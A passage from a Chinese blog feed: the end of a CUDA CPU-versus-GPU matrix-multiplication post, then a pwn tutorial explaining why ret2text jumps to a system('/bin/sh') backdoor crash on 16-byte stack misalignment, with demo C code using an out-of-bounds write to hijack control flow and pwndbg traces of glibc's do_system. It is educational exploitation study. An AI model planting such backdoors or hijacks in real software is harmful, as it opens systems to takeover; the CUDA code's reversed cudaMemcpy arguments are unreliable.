    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_A</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_B</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="n">cudaMalloc</span><span class="p">((</span><span class="kt">float</span><span class="o">***</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Matrix_GPU_C</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">Matrix_GPU_A</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">Matrix_GPU_B</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">Matrix_GPU_C</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
        <span class="n">cudaMemset</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">);</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">);</span>
        <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"cudaMalloc failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_A</span><span class="p">,</span><span class="n">Matrix_GPU_A</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_B</span><span class="p">,</span><span class="n">Matrix_GPU_B</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>
    <span class="n">cudaMemcpy</span><span class="p">(</span><span class="n">Matrix_CPU_C</span><span class="p">,</span><span class="n">Matrix_GPU_C</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span><span class="o">*</span> <span class="n">N</span><span class="o">*</span> <span class="n">N</span><span class="p">,</span><span class="n">cudaMemcpyHostToDevice</span><span class="p">);</span>

    <span class="kt">clock_t</span> <span class="n">CPU_begin</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">CPUMul</span><span class="p">();</span>
    <span class="kt">clock_t</span> <span class="n">CPU_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// check(Matrix_CPU_C);</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"CPU: "</span><span class="o">&lt;&lt;</span><span class="n">CPU_end</span> <span class="o">-</span> <span class="n">CPU_begin</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>

    <span class="n">dim3</span> <span class="n">block</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">N</span><span class="p">);</span>
    <span class="n">dim3</span> <span class="n">grid</span><span class="p">(</span><span class="n">N</span><span class="p">);</span>
    <span class="kt">clock_t</span> <span class="n">GPU_begin</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="n">GPUMul</span><span class="o">&lt;&lt;&lt;</span><span class="n">grid</span><span class="p">,</span> <span class="n">block</span><span class="o">&gt;&gt;&gt;</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">,</span> <span class="n">Matrix_GPU_B</span><span class="p">,</span> <span class="n">Matrix_GPU_C</span><span class="p">);</span>
    <span class="n">cudaDeviceSynchronize</span><span class="p">();</span>
    <span class="kt">clock_t</span> <span class="n">GPU_end</span> <span class="o">=</span> <span class="n">clock</span><span class="p">();</span>
    <span class="c1">// GPUCheck(Matrix_GPU_C);</span>
    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"GPU: "</span><span class="o">&lt;&lt;</span><span class="n">GPU_end</span> <span class="o">-</span> <span class="n">GPU_begin</span><span class="o">&lt;&lt;</span><span class="s">" ms"</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>

    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_A</span><span class="p">);</span>
    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_B</span><span class="p">);</span>
    <span class="n">cudaFree</span><span class="p">(</span><span class="n">Matrix_GPU_C</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 1024;</span>
CPU: 6607223 ms
GPU: 8970 ms
<span class="c"># const int N = 2048;</span>
CPU: 182436212 ms
GPU: 22204 ms
</code></pre></div></div> <h5 id="需要注意的是由于cpu和gpu是不同的部件两者之间需要通过pcie总线通信这个过程会消耗比较多的时间相较于单步计算而言所以在计算量比较小的时候gpu并行相较于cpu串行不会有太好的效果">   需要注意的是，由于CPU和GPU是不同的部件，两者之间需要通过PCIe总线通信，这个过程会消耗比较多的时间(相较于单步计算而言)，所以在计算量比较小的时候，GPU并行相较于CPU串行不会有太好的效果.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># const int N = 64;</span>
CPU: 1178 ms
GPU: 5040 ms
</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="dev"/><summary type="html"><![CDATA[ps: 课题来自于泥卓的课后作业 ps: 建议把页面markdown自己放到vscode或者typora上, 因为本站的markdown似乎没有办法显示Latex语法]]></summary></entry><entry><title type="html">XEE寄存器和16字节栈对齐.</title><link href="https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90/" rel="alternate" type="text/html" title="XEE寄存器和16字节栈对齐."/><published>2024-10-28T00:00:00+00:00</published><updated>2024-10-28T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/XEE%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C16%E5%AD%97%E8%8A%82%E6%A0%88%E5%AF%B9%E9%BD%90/"><![CDATA[ <h3 id="引子-demo0和demo1的对比">引子—-demo0和demo1的对比</h3> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo0</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">getshell</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">getshell</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="demo0直接在main中调用后门函数一切正常">   demo0，直接在main()中调用后门函数，一切正常</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo1</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">getshell</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">getshell</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="demo1-用数组越界来模拟pwn中的劫持控制流">   demo1, 用数组越界来模拟pwn中的劫持控制流。<br/></h5> <h5 id="然后理所当然地寄了就和pwn中直接返回到backdoor中一样">   然后理所当然地寄了，就和pwn中直接返回到backdoor中一样。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./test 
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</code></pre></div></div> <h5 id="一般这种情况有两种方法解决一种在ropchain中加一个ret指令一种直接劫持到system语句的位置跳过push-rbp">   一般这种情况，有两种方法解决，一种在ROPchain中加一个ret指令，一种直接劫持到<code class="language-plaintext highlighter-rouge">system()</code>语句的位置，跳过<code class="language-plaintext highlighter-rouge">push rbp</code><br/></h5> <h5 id="事实上并不是所有这种ret2text都需要这种技巧这和栈所在的环境有关不同的程序甚至于不同的机器之间栈都有细微的差别">   事实上并不是所有这种ret2text都需要这种技巧，这和栈所在的环境有关，不同的程序甚至于不同的机器之间栈都有细微的差别<br/></h5> <h3 id="如何检查16位栈对齐">如何检查16位栈对齐</h3> <h5 id="现在来探索一下system是如何检查栈不平衡的-利用上面的demo1动态调试">   现在来探索一下<code class="language-plaintext highlighter-rouge">system()</code>是如何检查栈不平衡的<br/>    利用上面的demo1动态调试</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3d70 &lt;system&gt;          endbr64 
 ► 0x7ffff7dd3d74 &lt;system+4&gt;        <span class="nb">test   </span>rdi, rdi     0x555555556004 &amp; 0x555555556004     EFLAGS <span class="o">=&gt;</span> 0x202 <span class="o">[</span> cf pf af zf sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3d77 &lt;system+7&gt;        je     system+16                   &lt;system+16&gt;
 
   0x7ffff7dd3d79 &lt;system+9&gt;        jmp    do_system                   &lt;do_system&gt;
    ↓
   0x7ffff7dd3900 &lt;do_system&gt;       push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;     mov    edx, 1                    EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd3907 &lt;do_system+7&gt;     push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;     lea    r14, <span class="o">[</span>rip + 0x1cbf30]     R14 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3910 &lt;do_system+16&gt;    push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;    lea    r13, <span class="o">[</span>rip + 0x1cbe87]     R13 <span class="o">=&gt;</span> 0x7ffff7f9f7a0 <span class="o">(</span>quit<span class="o">)</span> ◂— 0
   0x7ffff7dd3919 &lt;do_system+25&gt;    movq   xmm2, r14                 XMM2 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="在systemplt处stepin-可以看到单纯地进入system完全没有问题">   在<code class="language-plaintext highlighter-rouge">system@plt</code>处stepin, 可以看到单纯地进入<code class="language-plaintext highlighter-rouge">system</code>完全没有问题。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3d79 &lt;system+9&gt;        jmp    do_system                   &lt;do_system&gt;
    ↓
 ► 0x7ffff7dd3900 &lt;do_system&gt;       push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;     mov    edx, 1                    EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd3907 &lt;do_system+7&gt;     push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;     lea    r14, <span class="o">[</span>rip + 0x1cbf30]     R14 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3910 &lt;do_system+16&gt;    push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;    lea    r13, <span class="o">[</span>rip + 0x1cbe87]     R13 <span class="o">=&gt;</span> 0x7ffff7f9f7a0 <span class="o">(</span>quit<span class="o">)</span> ◂— 0
   0x7ffff7dd3919 &lt;do_system+25&gt;    movq   xmm2, r14                 XMM2 <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="然后跳转到do_system">   然后跳转到<code class="language-plaintext highlighter-rouge">do_system</code></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7dd3967 &lt;do_system+103&gt;    mov    qword ptr <span class="o">[</span>rsp + 0x188], 0                <span class="o">[</span>0x7fffffffd8c0] <span class="o">=&gt;</span> 0
   0x7ffff7dd3973 &lt;do_system+115&gt;    movaps xmmword ptr <span class="o">[</span>rsp], xmm1                   &lt;<span class="o">[</span>0x7fffffffd738] not aligned to 16 bytes&gt;
   0x7ffff7dd3977 &lt;do_system+119&gt;    lock cmpxchg dword ptr <span class="o">[</span>rip + 0x1cbe01], edx
   0x7ffff7dd397f &lt;do_system+127&gt;    jne    do_system+816               &lt;do_system+816&gt;
 
   0x7ffff7dd3985 &lt;do_system+133&gt;    mov    eax, dword ptr <span class="o">[</span>rip + 0x1cbdf9]           EAX, <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 0
   0x7ffff7dd398b &lt;do_system+139&gt;    lea    edx, <span class="o">[</span>rax + 1]                            EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd398e &lt;do_system+142&gt;    mov    dword ptr <span class="o">[</span>rip + 0x1cbdf0], edx           <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 1
   0x7ffff7dd3994 &lt;do_system+148&gt;    <span class="nb">test   </span>eax, eax                                  0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3996 &lt;do_system+150&gt;  ✔ je     do_system+536               &lt;do_system+536&gt;
    ↓
   0x7ffff7dd3b18 &lt;do_system+536&gt;    lea    rbp, <span class="o">[</span>rsp + 0x180]                  RBP <span class="o">=&gt;</span> 0x7fffffffd8b8 ◂— 1
   0x7ffff7dd3b20 &lt;do_system+544&gt;    mov    rdx, r14                            RDX <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
</code></pre></div></div> <h5 id="结果单步一下直接给我干到了do_system103的位置就是检查到没有16位对齐的上一句之前调试kernel的时候也有类似的问题">   结果单步一下直接给我干到了<code class="language-plaintext highlighter-rouge">do_system+103</code>的位置，就是检查到没有16位对齐的上一句，之前调试kernel的时候也有类似的问题<br/></h5> <h5 id="检查先放一下看一下do_system汇编免得漏掉什么">   检查先放一下，看一下<code class="language-plaintext highlighter-rouge">do_system</code>汇编，免得漏掉什么</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd3900 &lt;do_system&gt;:  push   r15
   0x7ffff7dd3902 &lt;do_system+2&gt;:        mov    edx,0x1
   0x7ffff7dd3907 &lt;do_system+7&gt;:        push   r14
   0x7ffff7dd3909 &lt;do_system+9&gt;:        lea    r14,[rip+0x1cbf30]        <span class="c"># 0x7ffff7f9f840 &lt;intr&gt;</span>
   0x7ffff7dd3910 &lt;do_system+16&gt;:       push   r13
   0x7ffff7dd3912 &lt;do_system+18&gt;:       lea    r13,[rip+0x1cbe87]        <span class="c"># 0x7ffff7f9f7a0 &lt;quit&gt;</span>
   0x7ffff7dd3919 &lt;do_system+25&gt;:       movq   xmm2,r14
   0x7ffff7dd391e &lt;do_system+30&gt;:       push   r12
   0x7ffff7dd3920 &lt;do_system+32&gt;:       movq   xmm1,r13
   0x7ffff7dd3925 &lt;do_system+37&gt;:       push   rbp
   0x7ffff7dd3926 &lt;do_system+38&gt;:       punpcklqdq xmm1,xmm2
   0x7ffff7dd392a &lt;do_system+42&gt;:       push   rbx
   0x7ffff7dd392b &lt;do_system+43&gt;:       mov    rbx,rdi
   0x7ffff7dd392e &lt;do_system+46&gt;:       sub    rsp,0x388
   0x7ffff7dd3935 &lt;do_system+53&gt;:       mov    rax,QWORD PTR fs:0x28
   0x7ffff7dd393e &lt;do_system+62&gt;:       mov    QWORD PTR <span class="o">[</span>rsp+0x378],rax
   0x7ffff7dd3946 &lt;do_system+70&gt;:       xor    eax,eax
   0x7ffff7dd3948 &lt;do_system+72&gt;:       mov    DWORD PTR <span class="o">[</span>rsp+0x18],0xffffffff
   0x7ffff7dd3950 &lt;do_system+80&gt;:       mov    QWORD PTR <span class="o">[</span>rsp+0x180],0x1
   0x7ffff7dd395c &lt;do_system+92&gt;:       mov    DWORD PTR <span class="o">[</span>rsp+0x208],0x0
<span class="o">=&gt;</span> 0x7ffff7dd3967 &lt;do_system+103&gt;:      mov    QWORD PTR <span class="o">[</span>rsp+0x188],0x0  <span class="c"># 执行到这里了</span>
   0x7ffff7dd3973 &lt;do_system+115&gt;:      movaps XMMWORD PTR <span class="o">[</span>rsp],xmm1
</code></pre></div></div> <h5 id="可以看到没有跳转就单纯是一路执行下来的关注一下两个xmm寄存器">   可以看到没有跳转，就单纯是一路执行下来的，关注一下两个xmm寄存器<br/></h5> <p>参考：https://cch123.gitbooks.io/duplicate/content/part3/translation-details/function-calling-sequence/xmm-registers.html</p> <h5 id="ssestreaming-simd-extensions是针对当前cpu寄存器以及指令集的一个拓展有xmm0--xmm1516个128bit的寄存器xmm寄存器主要干两件事第一个是浮点运算第二个是simd指令集一条指令操作多条数据对于xmm寄存器有几种方法控制其中的数据第一种movq指令q表示_qword既64bit该指令会操作xmm寄存器的低64bit而无需检查另一个操作数可以是xmm寄存器或者一个64bit寄存器第二种movdqa和movdqu表示double-_qworda代表alignedu代表unaligned用于将内存中的128bit数据或者某个xmm的数据转存到另一个xmm中很明显aligned代表在操作数为内存时需要16位对齐第三种movups和movapsu和a的含义不变而ps表示packed-single-precision-floating-point打包的单精度浮点数一个float有32bit而128bit就是4个float这就是simd的多条数据的含义第四种movupd和movapd几乎和第三种一样d可能表示data">   SSE(Streaming SIMD Extensions)是针对当前CPU寄存器以及指令集的一个拓展，有<code class="language-plaintext highlighter-rouge">xmm0 ~ xmm15</code>16个128bit的寄存器，xmm寄存器主要干两件事，第一个是浮点运算，第二个是SIMD指令集，一条指令操作多条数据。<br/>   对于xmm寄存器，有几种方法控制其中的数据，第一种<code class="language-plaintext highlighter-rouge">movq</code>指令，q表示_QWORD，既64bit，该指令会操作xmm寄存器的低64bit而无需检查，另一个操作数可以是xmm寄存器或者一个64bit寄存器；<br/>   第二种，movdqa和movdqu，表示Double _QWORD，a代表aligned，u代表unaligned，用于将内存中的128bit数据或者某个xmm的数据，转存到另一个xmm中，很明显aligned代表在操作数为内存时需要16位对齐<br/>   第三种，movups和movaps，u和a的含义不变，而ps表示packed single-precision floating-point(打包的单精度浮点数)，一个float有32bit，而128bit就是4个float，这就是SIMD的多条数据的含义。<br/>   第四种，movupd和movapd，几乎和第三种一样，d可能表示data<br/></h5> <h5 id="然后回到do_system103这里涉及sse为什么需要16位字节对齐首先显而易见地因为xmm是16字节所以对xmm寄存器的读取和别的数据一样要按数据类型大小对齐但是这实际上不能解释为什么存在不对齐的指令可能是指令做了一些拼接操作除了之前movq可以操作xmm的低64位之外一些像movhlpspunpckhqdq的指令可以操作xmm寄存器的高64位">   然后回到<code class="language-plaintext highlighter-rouge">do_system+103</code>，这里涉及SSE为什么需要16位字节对齐，首先显而易见地因为xmm是16字节，所以对xmm寄存器的读取和别的数据一样要按数据类型大小对齐，<br/>   但是这实际上不能解释为什么存在不对齐的指令，可能是指令做了一些拼接操作?除了之前movq可以操作xmm的低64位之外，一些像movhlps、punpckhqdq的指令可以操作xmm寄存器的高64位<br/></h5> <h5 id="做个总结涉及sse中特定指令比如movapsmovdqa需要当前内存类型操作数16位对齐反映在do_system中rsp指向位置需要16位对齐也就是栈需要16位对齐">   做个总结，涉及SSE中特定指令，比如movaps、movdqa需要当前内存类型操作数16位对齐，反映在<code class="language-plaintext highlighter-rouge">do_system</code>中，rsp指向位置需要16位对齐，也就是栈需要16位对齐。<br/></h5> <h3 id="为什么用xmm">为什么用xmm</h3> <h5 id="程序为什么要有这一步xmm到rsp的赋值操作先用print-xmm1看一下xmm1有什么">   程序为什么要有这一步xmm到<code class="language-plaintext highlighter-rouge">[rsp]</code>的赋值操作，先用<code class="language-plaintext highlighter-rouge">print $xmm1</code>看一下xmm1有什么</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; print <span class="nv">$xmm1</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>
  v8_bfloat16 <span class="o">=</span> <span class="o">{</span><span class="nt">-6</span>.49e+33, <span class="nt">-1</span>.01e+34, nan<span class="o">(</span>0x7f<span class="o">)</span>, 0, <span class="nt">-1</span>.558e+34, <span class="nt">-1</span>.01e+34, nan<span class="o">(</span>0x7f<span class="o">)</span>, 0<span class="o">}</span>,
  v8_half <span class="o">=</span> <span class="o">{</span><span class="nt">-31232</span>, <span class="nt">-32656</span>, nan<span class="o">(</span>0x3ff<span class="o">)</span>, 0, <span class="nt">-34816</span>, <span class="nt">-32656</span>, nan<span class="o">(</span>0x3ff<span class="o">)</span>, 0<span class="o">}</span>,
  v4_float <span class="o">=</span> <span class="o">{</span><span class="nt">-1</span>.01398777e+34, 4.59163468e-41, <span class="nt">-1</span>.01399768e+34, 4.59163468e-41<span class="o">}</span>,
  v2_double <span class="o">=</span> <span class="o">{</span>6.9533491570647782e-310, 6.9533491570726832e-310<span class="o">}</span>,
  v16_int8 <span class="o">=</span> <span class="o">{</span><span class="nt">-96</span>, <span class="nt">-9</span>, <span class="nt">-7</span>, <span class="nt">-9</span>, <span class="nt">-1</span>, 127, 0, 0, 64, <span class="nt">-8</span>, <span class="nt">-7</span>, <span class="nt">-9</span>, <span class="nt">-1</span>, 127, 0, 0<span class="o">}</span>,
  v8_int16 <span class="o">=</span> <span class="o">{</span><span class="nt">-2144</span>, <span class="nt">-2055</span>, 32767, 0, <span class="nt">-1984</span>, <span class="nt">-2055</span>, 32767, 0<span class="o">}</span>,
  v4_int32 <span class="o">=</span> <span class="o">{</span><span class="nt">-134613088</span>, 32767, <span class="nt">-134612928</span>, 32767<span class="o">}</span>,
  v2_int64 <span class="o">=</span> <span class="o">{</span>140737353742240, 140737353742400<span class="o">}</span>,
  uint128 <span class="o">=</span> 2596145946097181985715420921460640
<span class="o">}</span>
</code></pre></div></div> <h5 id="关注v2_int64的两个值0x7ffff7f9f7a0quit和0x7ffff7f9f840intr-这两个值在前面通过r13和r14寄存器放到了xmm1中在下面有对这两个值的使用以一种类似硬编码的方式使用">   关注<code class="language-plaintext highlighter-rouge">v2_int64</code>的两个值，0x7ffff7f9f7a0&lt;quit&gt;和0x7ffff7f9f840&lt;intr&gt; ,这两个值在前面通过r13和r14寄存器放到了xmm1中<br/>   在下面有对这两个值的使用，以一种类似硬编码的方式使用<br/></h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x7ffff7dd39d3 &lt;do_system+211&gt;:      xor    eax,eax
   0x7ffff7dd39d5 &lt;do_system+213&gt;:      cmp    QWORD PTR <span class="o">[</span>rip+0x1cbe63],0x1        <span class="c"># 0x7ffff7f9f840 &lt;intr&gt;</span>
   0x7ffff7dd39dd &lt;do_system+221&gt;:      setne  al
   0x7ffff7dd39e0 &lt;do_system+224&gt;:      add    rax,rax
   0x7ffff7dd39e3 &lt;do_system+227&gt;:      cmp    QWORD PTR <span class="o">[</span>rip+0x1cbdb5],0x1        <span class="c"># 0x7ffff7f9f7a0 &lt;quit&gt;</span>
   0x7ffff7dd39eb &lt;do_system+235&gt;:      mov    QWORD PTR <span class="o">[</span>rsp+0x100],rax
</code></pre></div></div> <h5 id="直接看汇编还是太逆天了下面是ida的反汇编注意qword_21c840是intrqword_21c7a0是quit">   直接看汇编还是太逆天了，下面是IDA的反汇编，注意qword_21C840是&lt;intr&gt;，qword_21C7A0是&lt;quit&gt;</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">v16</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="p">(</span><span class="n">qword_21C840</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">qword_21C7A0</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">v16</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2LL</span> <span class="o">*</span> <span class="p">(</span><span class="n">qword_21C840</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span> <span class="mi">4</span><span class="p">;</span>
  <span class="n">posix_spawnattr_init</span><span class="p">(</span><span class="n">v20</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setsigmask</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="n">v15</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setsigdefault</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="n">v16</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setflags</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="mi">12LL</span><span class="p">);</span>
</code></pre></div></div> <h5 id="后续是各种posix的操作也就是开进程">   后续是各种posix的操作，也就是开进程。</h5> <h5 id="然后-检查下当前程序走向如果不是栈平衡的问题应该到达do_system536也就是说上面开进程的内容被跳过了">   然后, 检查下当前程序走向，如果不是栈平衡的问题，应该到达<code class="language-plaintext highlighter-rouge">do_system+536</code>，也就是说上面开进程的内容被跳过了</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7dd3973 &lt;do_system+115&gt;    movaps xmmword ptr <span class="o">[</span>rsp], xmm1                   &lt;<span class="o">[</span>0x7fffffffd638] not aligned to 16 bytes&gt;
   0x7ffff7dd3977 &lt;do_system+119&gt;    lock cmpxchg dword ptr <span class="o">[</span>rip + 0x1cbe01], edx
   0x7ffff7dd397f &lt;do_system+127&gt;    jne    do_system+816               &lt;do_system+816&gt;
 
   0x7ffff7dd3985 &lt;do_system+133&gt;    mov    eax, dword ptr <span class="o">[</span>rip + 0x1cbdf9]           EAX, <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 0
   0x7ffff7dd398b &lt;do_system+139&gt;    lea    edx, <span class="o">[</span>rax + 1]                            EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd398e &lt;do_system+142&gt;    mov    dword ptr <span class="o">[</span>rip + 0x1cbdf0], edx           <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 1
   0x7ffff7dd3994 &lt;do_system+148&gt;    <span class="nb">test   </span>eax, eax                                  0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x10246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3996 &lt;do_system+150&gt;  ✔ je     do_system+536               &lt;do_system+536&gt;
    ↓
   0x7ffff7dd3b18 &lt;do_system+536&gt;    lea    rbp, <span class="o">[</span>rsp + 0x180]                  RBP <span class="o">=&gt;</span> 0x7fffffffd7b8 ◂— 1
